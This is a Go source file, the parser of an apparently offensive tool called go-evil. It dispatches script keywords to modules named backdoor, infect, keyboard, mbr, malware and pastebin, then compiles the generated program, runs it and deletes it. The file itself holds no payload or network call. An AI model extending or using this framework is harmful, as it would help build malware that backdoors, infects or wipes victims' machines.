package parser

import (
	"fmt"

	"github.com/s9rA16Bf4/go-evil/domains/attack_vector"
	"github.com/s9rA16Bf4/go-evil/domains/backdoor"
	"github.com/s9rA16Bf4/go-evil/domains/infect"
	"github.com/s9rA16Bf4/go-evil/domains/keyboard"
	"github.com/s9rA16Bf4/go-evil/domains/malware"
	"github.com/s9rA16Bf4/go-evil/domains/mbr"
	"github.com/s9rA16Bf4/go-evil/domains/network"
	"github.com/s9rA16Bf4/go-evil/domains/pastebin"
	"github.com/s9rA16Bf4/go-evil/domains/powershell"
	"github.com/s9rA16Bf4/go-evil/domains/system"
	"github.com/s9rA16Bf4/go-evil/domains/time"
	"github.com/s9rA16Bf4/go-evil/domains/window"
	"github.com/s9rA16Bf4/go-evil/utility/io"
	"github.com/s9rA16Bf4/go-evil/utility/json"
	"github.com/s9rA16Bf4/go-evil/utility/object"
	"github.com/s9rA16Bf4/notify_handler/go/notify"
)

func Parser(base_64_serialize_json string) string {

	data_structure := json.Receive(base_64_serialize_json)
	data_structure.Append_to_call("Parser")

	data_structure = json.Receive(Regex(Variable(Strip(Imports(Read_file(json.Send(data_structure)))))))

	for _, domain := range data_structure.File_Headers {
		notify.Log(fmt.Sprintf("Found called domain '%s'", domain), data_structure.Verbose_LVL, "3")

		// Code that can look up if a domain has been imported
		// for i, defined_domain := range data_structure.Imported_headers {
		// 	if defined_domain == domain { // We found the domain
		// 		break
		// 	} else if i+1 >= len(data_structure.Imported_headers) { // We have reached the end, and yet no domains
		// 		notify.Error(fmt.Sprintf("Found the utilization of domain '%s', yet it was not imported!", domain),
		// 			"parser.Parser()")
		// 	}
		// }

		if data_structure.DevelMode {
			development_warning()
		}

		switch domain { // This will be the top level domain
		case "window":
			data_structure = json.Receive(io.Append_domain(domain, json.Send(data_structure)))
			data_structure = json.Receive(window.Parse(json.Send(data_structure)))

		case "system":
			data_structure = json.Receive(io.Append_domain(domain, json.Send(data_structure)))
			data_structure = json.Receive(system.Parse(json.Send(data_structure)))

		case "network", "#net":
			data_structure = json.Receive(io.Append_domain(domain, json.Send(data_structure)))
			data_structure = json.Receive(network.Parse(json.Send(data_structure)))

		case "malware", "#object", "#self", "#this":
			data_structure = json.Receive(io.Append_domain(domain, json.Send(data_structure)))
			data_structure = json.Receive(malware.Parse(json.Send(data_structure)))

		case "keyboard":
			data_structure = json.Receive(io.Append_domain(domain, json.Send(data_structure)))
			data_structure = json.Receive(keyboard.Parse(json.Send(data_structure)))

		case "backdoor":
			data_structure = json.Receive(io.Append_domain(domain, json.Send(data_structure)))
			data_structure = json.Receive(backdoor.Parse(json.Send(data_structure)))

		case "attack":
			data_structure = json.Receive(io.Append_domain(domain, json.Send(data_structure)))
			data_structure = json.Receive(attack_vector.Parse(json.Send(data_structure)))

		case "powershell", "#pwsh":
			data_structure = json.Receive(io.Append_domain(domain, json.Send(data_structure)))
			data_structure = json.Receive(powershell.Parse(json.Send(data_structure)))

		case "time", "#wait":
			data_structure = json.Receive(io.Append_domain(domain, json.Send(data_structure)))
			data_structure = json.Receive(time.Parse(json.Send(data_structure)))

		case "pastebin", "#paste":
			data_structure = json.Receive(io.Append_domain(domain, json.Send(data_structure)))
			data_structure = json.Receive(pastebin.Parse(json.Send(data_structure)))

		case "mbr":
			data_structure = json.Receive(io.Append_domain(domain, json.Send(data_structure)))
			data_structure = json.Receive(mbr.Parse(json.Send(data_structure)))

		case "infect":
			data_structure = json.Receive(io.Append_domain(domain, json.Send(data_structure)))
			data_structure = json.Receive(infect.Parse(json.Send(data_structure)))

		default:
			notify.Error(fmt.Sprintf("Unknown top level domain '%s'", domain), "parser.Parse()")
			return ""
		}
	}

	return json.Send(data_structure)
}

func Interpreter(file_to_read string, base_64_serialize_json string) string {
	data_structure := json.Receive(base_64_serialize_json)
	data_structure.Append_to_call("parser.Interpreter()")

	data_structure = json.Receive(Parser(json.Send(data_structure)))          // Will basically develop the final code we utilize
	data_structure = json.Receive(io.Write_file(json.Send(data_structure)))   // Creates the file in the output directory
	data_structure = json.Receive(io.Compile_file(json.Send(data_structure))) // Compiles it
	io.Run_file(fmt.Sprintf("./output/%s", object.GetName()))                 // Runs the file
	io.Remove_file(fmt.Sprintf("./output/%s", object.GetName()))              // Removes the file and voila we have a simpel interpreter

	return json.Send(data_structure)
}
